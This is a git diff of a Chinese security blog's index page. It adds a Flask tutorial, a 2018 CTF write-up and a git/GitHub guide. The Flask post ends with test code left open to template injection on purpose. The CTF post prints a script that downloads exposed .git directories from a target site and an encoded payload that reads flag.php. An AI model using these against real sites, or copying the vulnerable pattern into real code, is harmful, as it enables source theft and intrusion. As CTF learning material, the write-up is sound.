@@ -292,6 +292,662 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/14/flask从0到无/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/14/flask从0到无/" itemprop="url">Flask从零到无</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-14T00:00:00+08:00">
+                2018-12-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="零基础学起"><a href="#零基础学起" class="headerlink" title="零基础学起"></a>零基础学起</h1><p>学习flask我选择了 pycharm，学生的话可以免费下载专业版。废话不多说了。  </p>
+<p>环境：python 3.6+<br>基础：0-<br>日期：2018.12.14 </p>
+<h1 id="flask入门"><a href="#flask入门" class="headerlink" title="flask入门"></a>flask入门</h1><h2 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h2><p>pycharm安装flask会自动导入了flask所需的模块，所以我们只需要命令安装所需要的包就可以了，建议用python3.6学习而不是2.7，毕竟django都快要不支持2.7了，早换早超生。</p>
+<p>自动导入的也是python 3.6。<br><img src="https://i.imgur.com/VgalqNv.png" alt></p>
+<p>运行这边会出小错，因为此时我们还没有安装flask包，</p>
+<p><img src="https://i.imgur.com/9C4jrbP.png" alt></p>
+<p>这样就可以正常运行了，运行成功便会返回 </p>
+<pre><code> * Debug mode: off
+ * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
+127.0.0.1 - - [14/Dec/2018 20:32:20] &quot;GET / HTTP/1.1&quot; 200 -
+127.0.0.1 - - [14/Dec/2018 20:32:20] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -</code></pre><p>此时可以在web上运行hello world了，访问<a href="http://127.0.0.1:5000。可以看到打印出Hello" target="_blank" rel="noopener">http://127.0.0.1:5000。可以看到打印出Hello</a> World</p>
+<h2 id="route装饰器路由"><a href="#route装饰器路由" class="headerlink" title="route装饰器路由"></a>route装饰器路由</h2><pre><code>@app.route(&apos;/&apos;)</code></pre><p>使用 route() 装饰器告诉 Flask 什么样的URL 能触发我们的函数。 route() 装饰器把一个函数绑定到对应的 URL 上，这句话相当于路由，一个路由跟随一个函数，如</p>
+<pre><code>@app.route(&apos;/&apos;)
+def test()&quot;
+   return 123</code></pre><p>访问127.0.0.1:5000/ 则会输出123，我们修改一下规则</p>
+<pre><code>@app.route(&apos;/test&apos;)
+def test()&quot;
+   return 123</code></pre><p>这个时候访问127.0.0.1:5000/test 会输出123。<br>此外还可以设置动态url，</p>
+<pre><code>@app.route(&quot;/hello/&lt;username&gt;&quot;)
+def hello_user(username):
+  return &quot;user:%s&quot;%username</code></pre><p>根据url里的输入，动态辨别身份，此时便可以看到如下页面：</p>
+<p><img src="https://i.imgur.com/P2XIEeU.png" alt></p>
+<p>或者可以使用int型，转换器有下面几种：</p>
+<pre><code>int    接受整数
+float    同 int ，但是接受浮点数
+path    和默认的相似，但也接受斜线
+
+@app.route(&apos;/post/&lt;int:post_id&gt;&apos;)
+def show_post(post_id):
+    # show the post with the given id, the id is an integer
+    return &apos;Post %d&apos; % post_id</code></pre><h2 id="main入口"><a href="#main入口" class="headerlink" title="main入口"></a>main入口</h2><p>当.py文件被直接运行时，if <strong>name</strong> == ‘<strong>main</strong>‘之下的代码块将被运行；当.py文件以模块形式被导入时，if <strong>name</strong> == ‘<strong>main</strong>‘之下的代码块不被运行。如果你经常以cmd方式运行自己写的python小脚本，那么不需要这个东西，但是如果需要做一个稍微大一点的python开发，写 if <strong>name ==’</strong>main__’ 是一个良好的习惯，大一点的python脚本要分开几个文件来写，一个文件要使用另一个文件，也就是模块，此时这个if就会起到作用不会运行而是类似于文件包含来使用。    </p>
+<pre><code>if __name__ == &apos;__main__&apos;:
+    app.debug = True
+    app.run()</code></pre><p>测试的时候，我们可以使用debug，方便调试，增加一句</p>
+<pre><code>app.debug = True
+或者（效果是一样的）
+app.run(debug=True)</code></pre><p>这样我们修改代码的时候直接保存，网页刷新就可以了，如果不加debug，那么每次修改代码都要运行一次程序，并且把前一个程序关闭。否则会被前一个程序覆盖。</p>
+<pre><code>app.run(host=&apos;0.0.0.0&apos;)</code></pre><p>这会让操作系统监听所有公网 IP,此时便可以在公网上看到自己的web。</p>
+<h2 id="http请求方法"><a href="#http请求方法" class="headerlink" title="http请求方法"></a>http请求方法</h2><p>页面需要get请求或者post请求也可以由路由来解决，通过 route() 装饰器传递 methods 参数。如我们要在登录页面使用get或者post登录输入。</p>
+<pre><code>@app.route(&apos;/login&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])
+def login():
+    if request.method == &apos;POST&apos;:
+        do_the_login()
+    else:
+        show_the_login_form()</code></pre><h2 id="模版渲染"><a href="#模版渲染" class="headerlink" title="模版渲染"></a>模版渲染</h2><p>何为模版渲染  点击连接—&gt;&gt;&gt;  <a href="https://shuaizhupeiqi.github.io/2018/11/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://shuaizhupeiqi.github.io/2018/11/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</a></p>
+<p>你可以使用 render_template() 方法来渲染模板。你需要做的一切就是将模板名和你想作为关键字的参数传入模板的变量。这里有一个展示如何渲染模板的简例:</p>
+<p>简单的模版渲染示例</p>
+<pre><code>from flask import render_template
+
+@app.route(&apos;/hello/&apos;)
+@app.route(&apos;/hello/&lt;name&gt;&apos;)
+def hello(name=None):
+        return render_template(&apos;hello.html&apos;, name=name)</code></pre><h1 id="flask简单实例"><a href="#flask简单实例" class="headerlink" title="flask简单实例"></a>flask简单实例</h1><p>我们从模板渲染开始实例，因为我们毕竟不是做开发的，flask以模板注入闻名，所以我们先从flask模版渲染入手深入剖析。</p>
+<p>首先要搞清楚，模板渲染体系，render_template函数渲染的是templates中的模板，所谓模板是我们自己写的html，里面的参数需要我们根据每个用户需求传入动态变量。</p>
+<pre><code>├── app.py  
+├── static  
+│   └── style.css  
+└── templates  
+    └── index.html  </code></pre><p><img src="https://i.imgur.com/vWxXdEc.png" alt></p>
+<p>我们写一个index.html文件写templates文件夹中。</p>
+<pre><code>&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;{{title}} - 小猪佩奇&lt;/title&gt;
+  &lt;/head&gt;
+ &lt;body&gt;
+      &lt;h1&gt;Hello, {{user.name}}!&lt;/h1&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre><p>里面有两个参数需要我们渲染，user.name，以及title</p>
+<p>我们在app.py文件里进行渲染。</p>
+<pre><code>@app.route(&apos;/&apos;)
+@app.route(&apos;/index&apos;)#我们访问/或者/index都会跳转
+def index():
+   user = {&apos;name&apos;: &apos;小猪佩奇&apos;}#传入一个字典数组
+   return render_template(&quot;index.html&quot;,title=&apos;Home&apos;,user=user)</code></pre><p><img src="https://i.imgur.com/RyvwVaU.png" alt></p>
+<p>这次渲染我们没有使用用户可控，所以是安全的，如果我们交给用户可控并且不过滤参数就有可能造成SSTI模板注入漏洞。<br>jinja2模板同样支持控制语句，在｛% %｝中输入我们的代码。如</p>
+<pre><code>{% if title %}
+    <title>{{title}} - xzpq</title>
+    {% else %}
+    <title>Welcome to xzpq</title>
+    {% endif %}</code></pre><p>如果传入title参数那么执行</p>
+<pre><code>&lt;title&gt;{{title}} - xzpq&lt;/title&gt; </code></pre><p>否则执行</p>
+<pre><code>&lt;title&gt;Welcome to xzpq&lt;/title&gt; </code></pre><p>最后执行下面未写出。</p>
+<p>本文暂且到这里，主要是为了配合ssti模板注入而了解flask注入。看继续参考博文SSTI模板注入。</p>
+<p>测试的代码贴上</p>
+<pre><code>from flask import Flask
+from flask import render_template
+from flask import request
+from flask import render_template_string
+app = Flask(__name__)
+
+@app.route(&apos;/login&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])
+def login():
+    if request.method == &apos;POST&apos;:
+        do_the_login()
+    else:
+        show_the_login_form()
+
+@app.route(&apos;/&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;])
+@app.route(&apos;/index&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;])#我们访问/或者/index都会跳转
+def index():
+   return render_template(&quot;index.html&quot;,title=&apos;Home&apos;,user=request.args.get(&quot;key&quot;))
+
+
+@app.route(&apos;/test&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;])
+def test():
+    template = &apos;&apos;&apos;
+        &lt;div class=&quot;center-content error&quot;&gt;
+            &lt;h1&gt;Oops! That page doesn&apos;t exist.&lt;/h1&gt;
+            &lt;h3&gt;%s&lt;/h3&gt;
+        &lt;/div&gt; 
+    &apos;&apos;&apos; %(request.url)
+    return render_template_string(template)
+
+
+if __name__ == &apos;__main__&apos;:
+    app.debug = True
+    app.run()</code></pre><hr>
+<p>参考：<a href="http://www.pythondoc.com/flask-mega-tutorial/" target="_blank" rel="noopener">http://www.pythondoc.com/flask-mega-tutorial/</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/06/南邮CTF-2018/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/06/南邮CTF-2018/" itemprop="url">南邮CTF-2018</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-06T00:00:00+08:00">
+                2018-12-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="全球最大交友网站"><a href="#全球最大交友网站" class="headerlink" title="全球最大交友网站"></a>全球最大交友网站</h1><p>进入网站是一个时钟。<br><img src="https://i.imgur.com/0Pw6skq.png" alt><br>并没什么思路，只能拿工具扫一下了。.git禁止访问，可能存在git源码泄露。用lijiejie的工具，下载源码发现没啥乱用，一个readme.txt。本来没想点进去，发现确实有提示</p>
+<p>Allsource files areingit tag1.0</p>
+<p>这意思是所有的源码都在 tag1.0中，也就是不在这个版本中。也就是说这个版本他把仓库东西给删除了，你如果想要1.0版本必须要回溯到1.0版本。不过既然有.git按道理说都是可以看到的。一个工具给大家。</p>
+<pre><code>#!/bin/bash
+#
+# Author: Denny Huang &lt;denny0223@gmail.com&gt;
+# Wed Sep 17 2014
+# MIT License
+function downloadBlob {
+    echo downloadBlob $1
+    mkdir -p ${1:0:2}
+    cd $_
+
+    wget -q -nc $domain/.git/objects/${1:0:2}/${1:2}
+
+    cd ..
+}
+
+function parseTree {
+    echo parseTree $1
+
+    downloadBlob $1
+
+    while read line
+    do
+        type=$(echo $line | awk &apos;{print $2}&apos;)
+        hash=$(echo $line | awk &apos;{print $3}&apos;)
+
+        [ &quot;$type&quot; = &quot;tree&quot; ] &amp;&amp; parseTree $hash || downloadBlob $hash
+    done &lt; &lt;(git cat-file -p $1)
+}
+
+function parseCommit {
+    echo parseCommit $1
+
+    downloadBlob $1
+
+    tree=$(git cat-file -p $1| sed -n &apos;1p&apos; | awk &apos;{print $2}&apos;)
+    parseTree $tree
+
+    parent=$(git cat-file -p $1 | sed -n &apos;2p&apos; | awk &apos;{print $2}&apos;)
+
+    [ ${#parent} -eq 40 ] &amp;&amp; parseCommit $parent
+}
+
+[ -z $1 ] &amp;&amp; echo -e &quot;missing target url\n\n\
+Usage: scrabble &lt;url&gt;\n\
+Example: scrabble http://example.com/\n\n\
+You need make sure target url had .git folder&quot;\
+&amp;&amp; exit
+
+domain=$1
+ref=$(curl -s $domain/.git/HEAD | awk &apos;{print $2}&apos;)
+
+lastHash=$(curl -s $domain/.git/$ref)
+
+git init
+
+cd .git/objects/
+
+parseCommit $lastHash
+
+cd ../../
+
+echo $lastHash &gt; .git/refs/heads/master
+
+git reset --hard</code></pre><p>用法如图<br>注意 scrabble 是我上面脚本的名字。无需后缀，要在linux bash运行<br><img src="https://i.imgur.com/DN5IB6S.png" alt></p>
+<p>之后便可以当作自己的git仓库来使用。如 git log</p>
+<p><img src="https://i.imgur.com/xJhVeKY.png" alt></p>
+<p>上面是我本地测试自己的代码。我们回归正题。因为题目已经关了，没法复现题目中的git,意思就是git log，查看到各个版本的版本号，然后 </p>
+<p>git show HEAD 版本号查看进行了什么修改增加便可以看到flag。</p>
+<p>root@xiaozhupeiqi:/scrabble# git show HEAD cf36b7a28707d581e4c5be4a2061ad41c9d386e2</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11900959-7ad0cc3749de9cf4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/457" alt></p>
+<h1 id="小绿草之最强大脑"><a href="#小绿草之最强大脑" class="headerlink" title="小绿草之最强大脑"></a>小绿草之最强大脑</h1><p><img src="https://i.imgur.com/ZI77p9c.png" alt></p>
+<p>前言：比赛结束后测试的，自我认为是环境问题，使用别人的poc也跑不出来flag，就当自己练习脚本了。</p>
+<p>先贴出脚本自写（未验证准确性）</p>
+<pre><code>import requests
+import re
+import time
+url=&apos;http://127.0.0.1/2/index.php&apos;
+s=requests.Session()
+r=s.get(url)
+while(1):
+    a = r.content[1600:4250].decode(encoding=&apos;utf-8&apos;)
+    matchp = re.findall(r&apos;[0-9\+\-\*]&apos;,a)
+    a=&quot;&quot;
+    for i in matchp:
+        a=a+i
+    b=&quot;&quot;
+    map=re.findall(r&apos;[1-9]+[0]*[1-9]+[0]*[1-9]+[0]*[1-9]+[\+\-\*]*&apos;,a)
+    for i in map:
+        b=b+i
+    b=&apos;9223372036854775807+&apos;+b
+    print b
+    print eval(b)
+
+    c=eval(b)
+
+    payload={&apos;input&apos;:&apos;1111111111111111111111&apos;,&apos;ans&apos;:c}
+    r=s.post(url,data=payload)
+    time.sleep(1.5)
+    print r.content.decode(encoding=&apos;utf-8&apos;)</code></pre><p>分析：<br>此题中一看场面应该是自写脚本然后计算结果快速提交。但是肯定会有考其他的知识点。以后看到ctf先扫一波，扫到源码</p>
+<p>源码中有一很重要的知识点<br>知识点 1</p>
+<pre><code>if(($_SESSION[&apos;ans&apos;])+intval($_POST[&apos;input&apos;])!=$_POST[&apos;ans&apos;]){</code></pre><p>intval 是防止程序溢出的函数，32位系统溢出最大：2147483647 64位系统溢出最大：9223372036854775807，检测为64位系统，所以你提交22位的数字会自动转化为 9223372036854775807，所以脚本计算的时候要使用 9223372036854775807 而不是22位自己input的数字。</p>
+<p>知识点2 </p>
+<pre><code>if(intval(time())-$_SESSION[&apos;time&apos;]&lt;1){
+            session_destroy();
+            echo &apos;
+            &lt;script language=&quot;javascript&quot;&gt;  
+            alert(&quot;你手速太快啦，服务器承受不住!!!&quot;);  
+            window.history.back(-1); &lt;/script&gt; &apos;;
+        }</code></pre><p>源码中指定不能提交速度太快，在github上下载的所有源码规定的是如果你提交五次正确答案就给你flag，但是你不能提交太快，我们使用函数<br>time.sleep(1.5)，定义1.5S 提交一次。</p>
+<p>知识点3 </p>
+<p>正则，我是没写过几次正则的，所以写的很辣鸡，是真的辣鸡，匹配有点鸡肋，说不清自己体会把。。</p>
+<p>知识点4</p>
+<p>必须要做一个session，因为需要一个用户提交五次及以上。</p>
+<p>知识点5</p>
+<p>findall函数要学清楚，细心！就完事。</p>
+<p>脚本运行截图</p>
+<p><img src="https://i.imgur.com/rO6sIC8.png" alt><br>不要问我为什么没算对，应该是直接下载源码环境不对，算是肯定算对了的，网上下载的poc也同样没跑出来flag，应该是环境嗯，环境问题。</p>
+<h1 id="Go-Lakers"><a href="#Go-Lakers" class="headerlink" title="Go Lakers"></a>Go Lakers</h1><p>进去之后发现网站跳转302，抓包，看到最下面，（我发现CTF不细心的人做不出来还会原地爆炸）<br><img src="https://i.imgur.com/BEAt4p8.png" alt></p>
+<!-- post me viewsource -->
+<p>post 一个 viewsource参数就好看到源码</p>
+<p><img src="https://i.imgur.com/wH9nOh1.png" alt></p>
+<pre><code>if(!(getip() === &apos;127.0.0.1&apos; &amp;&amp; file_get_contents($_GET[&apos;9527&apos;]) === &apos;nctf_is_good&apos; &amp;&amp; mt_rand(1,10000) === intval($_GET[&apos;go_Lakers&apos;]))){
+    header(&apos;location:https://bbs.hupu.com/24483652.html?share_from=kqapp&apos;);
+}else{
+    echo &apos;great&apos;;
+}</code></pre><p>这玩意是**骗人的，不用绕我日！<br>自己体会。利用最后一句源码 就是读取文件就完事</p>
+<pre><code>echo file_get_contents(de_code($_GET[&apos;file_&apos;]));</code></pre><p>将function逆向编写，然后顺理成章的下面就会读取文件。flag.php就在当前文件下，直接读就行了</p>
+<p>逆向代码</p>
+<pre><code>for($i=0;$i&lt;strlen($value);$i++){
+        $result .= chr(ord($value[$i])+$i*2);
+    }
+    $result=base64_encode($result);
+    echo $result;</code></pre><p>value输入想读的文件输入flag.php 转换成Zm5lbTZ6dH4=<br>然后提交file_=Zm5lbTZ6dH4=就可读取flag.php<br>千万不要被骗了，哭了！<br><img src="https://i.imgur.com/L3m1MHA.png" alt></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/04/git工具的使用/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/04/git工具的使用/" itemprop="url">git使用与部署github</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-04T00:00:00+08:00">
+                2018-12-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="GIT是什么"><a href="#GIT是什么" class="headerlink" title="GIT是什么"></a>GIT是什么</h1><p>GIT是先进的分布式版本控制系统，既然是分布式控制系统，那么就是没有中央服务器的，每个终端都可以是一个完整的库，如果家庭单位两台电脑如何修改库呢，只需要推送给对方进行修改即可。既然是分布式，每台电脑就可以是一个库那么也就自然不需要连接服务器进行上传了，不过接下来我们要介绍到上传github上。</p>
+<h1 id="git有什么好处"><a href="#git有什么好处" class="headerlink" title="git有什么好处"></a>git有什么好处</h1><p>git最大的好处就是方便，好吧，如何方便呢，他可以自由回退各个版本，就是你对一个库的任何修改他都会保存，如果你用不到那么可以不用知道他的存在，如果你需要，他可以调用出来你以前的版本。举个例子。</p>
+<p>一个版本库存放一个项目，并且已经推送到github上供人下载，此时你要更新到下一个版本，进行修改推送到网站上，但是你发现有一个大bug，但是时间太久记不清修改了哪里，毕竟那么多细节，此时就可以用git按照日期回退版本，在进行从新开发。对任意时间段的版本重置。并且你可以对每次改动增加一个备注，比如：</p>
+<pre><code>版本    文件名      操作人   说明             日期
+1       test.txt   guest   增加项目1        2018.1.1
+2       test.txt   admin   删除第五行       2018.2.1
+2       test.txt   admin   修改管理员密码    2018.2.1</code></pre><p>这样可以极大方便开发人员操作人员的修改推送。</p>
+<h1 id="windows下gitbash"><a href="#windows下gitbash" class="headerlink" title="windows下gitbash"></a>windows下gitbash</h1><p>在windows下安装git工具，下载安装网上教程自寻。</p>
+<p>然后打开gitbash，一个git命令行，一些linux命令 windows命令可以使用，自己体会下。</p>
+<p>一切的操作都基于git bash操作，接下来我们详解git命令。</p>
+<h1 id="git命令学习"><a href="#git命令学习" class="headerlink" title="git命令学习"></a>git命令学习</h1><p>git init //把这个目录变成git可以管理的仓库<br><img src="https://i.imgur.com/Bdyf3dH.png" alt><br>.git目录是Git来跟踪管理版本的，不要轻易改动。<br>2.创建文件夹 mkdir test<br>  创建文件 touch 1.txt</p>
+<p><img src="https://i.imgur.com/WveLFit.png" alt><br>3.传送到我们的仓库</p>
+<p>git add 1.txt //将1.txt添加到暂存区。<br>如果想要将本文件夹全部添加到暂存区那么可以 git add .</p>
+<p>git commit告诉Git 添加到仓库<br>git commit -m ‘pqtest’//把文件提交到仓库，pqtest为本次修改的备注，通常用来备注复了某某bug等   </p>
+<p>还有一步推送出去，下面文章的github会讲到。<br>4.status查看当前状态<br>git status //查看状态是否有文件未提交<br><img src="https://i.imgur.com/GCr4PwH.png" alt></p>
+<p>git bash支持许多linux命令，自带vi我们vi 1.txt修改 增加几个1111<br>git diff 1.txt即可看到增加删减的东西。<br>或者 git diff即可看到所有有变动的更改。<br><img src="http://a3.qpic.cn/psb?/V14K5DCn0YAkcr/cJBSZ88MaJLhkCtaVTf9c6ai8KQGDREIrJVhzhOyT.E!/b/dFIBAAAAAAAA&ek=1&kp=1&pt=0&bo=kARRAQAAAAADF*Y!&tl=1&vuin=275640346&tm=1543928400&sce=60-2-2&rf=viewer_4" alt></p>
+<p>5.查看更改日志</p>
+<p>git log 查看更改日志。<br><img src="http://a3.qpic.cn/psb?/V14K5DCn0YAkcr/wKOeGuA3zT0pUoGygPgg.gPJwTiCS59LQB5sxdjp6Bw!/b/dLYAAAAAAAAA&ek=1&kp=1&pt=0&bo=8wQjAgAAAAADF.Q!&tl=1&vuin=275640346&tm=1543932000&sce=60-2-2&rf=viewer_4" alt><br>6.版本回退</p>
+<p>git reset –hard HEAD^ //版本回退到上一个版本。<br>回退之后 git log也相应地删除。</p>
+<p>git reflog 来查看历史操作，我们可以看到回退的版本。可以再次回退到之前的版本。</p>
+<p>git reset –hard 96ddb1f</p>
+<p>7.撤销操作<br>如果你不小心修改了文件，但是忘记修改了哪里很细小的细节。有两种方法。<br>第一种可以版本回退到上一个版本 ：git reset –hard HEAD^<br>第二种撤销文件操作，git checkout – 1.txt （比如我修改的是1.txt）</p>
+<p><img src="https://i.imgur.com/H8vhck3.png" alt></p>
+<h1 id="github管理"><a href="#github管理" class="headerlink" title="github管理"></a>github管理</h1><p>1.我们先从本地连接到github，首先创建一个项目/库<br><img src="https://i.imgur.com/8SnS1Ht.png" alt></p>
+<p><img src="https://i.imgur.com/3f9DQ7U.png" alt></p>
+<p>2.然后打开gitbash 输入命令：ssh-keygen -t rsa -C “<a href="mailto:xxx@qq.com" target="_blank" rel="noopener">xxx@qq.com</a>“//填写自己注册的邮箱即可</p>
+<p>一路回车<br><img src="http://a3.qpic.cn/psb?/V14K5DCn0YAkcr/Jrita1ue.P*6PxIuxlQVtF18OxYhW49.xhsg*29wspY!/b/dLYAAAAAAAAA&ek=1&kp=1&pt=0&bo=2AW1AgAAAAADF1g!&tl=1&vuin=275640346&tm=1543899600&sce=60-2-2&rf=viewer_4" alt></p>
+<p>其中（/c/users/1/.ssh/id_rsa）目录存放密钥。//我自己默认的路径，上图中第四行</p>
+<p>打开 <a href="https://github.com/settings/ssh/new" target="_blank" rel="noopener">https://github.com/settings/ssh/new</a></p>
+<p>title 写备注，Key填写刚刚连接的时候目录下的密钥，id_rsa.pub文件打开复制密钥，全部保存到Key然后添加密钥即可。</p>
+<p>然后检验是否成功连接 输入命令 ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a><br><img src="https://i.imgur.com/joU0Baw.png" alt></p>
+<p>如果你是第一次，输入yes就可以了，我这个是之前配置过所以直接显示successful,如果你的是出现不是这些内容，有可能是显示权限问题什么的，就应该是我上面提到的那种情况，你看一下你生成密钥时是否操作正确，目录下是否有那个known_hosts这个文件。</p>
+<p>3.最后配置config</p>
+<pre><code>git config –global user.name “用户名”
+git config –global user.email “邮箱”    </code></pre><p>配置完成输入命令 git config –global –list查看是否配置成功。Git和github配置完了，现在可以在github托管我们的项目了。</p>
+<p>4.打开一个文件夹打开git bash，使用输入命令<br>git init来使他成为一个仓库。</p>
+<p>5.然后远程连接到仓库。</p>
+<p>输入命令：git remote add origin <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:shuaizhupeiqi/test</p>
+<p>shuaizhupeiqi，是我的用户名，test是仓库名字</p>
+<p><img src="http://a1.qpic.cn/psb?/V14K5DCn0YAkcr/rH5NFBkKNMsvoRFoNokjphwr3cz37BRopQkMZ1U.GXk!/b/dFQBAAAAAAAA&ek=1&kp=1&pt=0&bo=fgFjAAAAAAADFy4!&tl=1&vuin=275640346&tm=1543924800&sce=60-2-2&rf=viewer_4" alt></p>
+<p>6.由于创建仓库的时候，默认创建了readme.md,所以本地是与仓库不同步的。我们先同步一下。</p>
+<p>git pull <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:shuaizhupeiqi/test</p>
+<p>7.上传更新</p>
+<p>第一步：git   add  . //后面是一个英文的.<br>第二步：git   commit   –m   “1”   (如果提交单个文件1，就这样写；如果提交所有文件，写成：git   commit   –m  *)<br>第三步：git   push   <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:shuaizhupeiqi/test//这样就可以推送上去了。  </p>
+<p><img src="http://a3.qpic.cn/psb?/V14K5DCn0YAkcr/M4vqusCrfUGeaBBFkQiuKiX4mqnMNk.Enm*Cf0JupbE!/b/dD4BAAAAAAAA&ek=1&kp=1&pt=0&bo=VgUlAwAAAAADF0c!&tl=1&vuin=275640346&tm=1543924800&sce=60-2-2&rf=viewer_4" alt><br>这样就完成了。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/03/sql注入/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1400,461 +2056,6 @@ AddOutputFilter INCLUDES .shtml</code></pre><p>.stm，.shtm和.shtml的页面是
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/16/2018 高校网络信息安全管理运维挑战赛/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="小猪佩奇">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.ico">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sec-Communication">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/16/2018 高校网络信息安全管理运维挑战赛/" itemprop="url">EIS-CTF2018</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-16T00:00:00+08:00">
-                2018-11-16
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
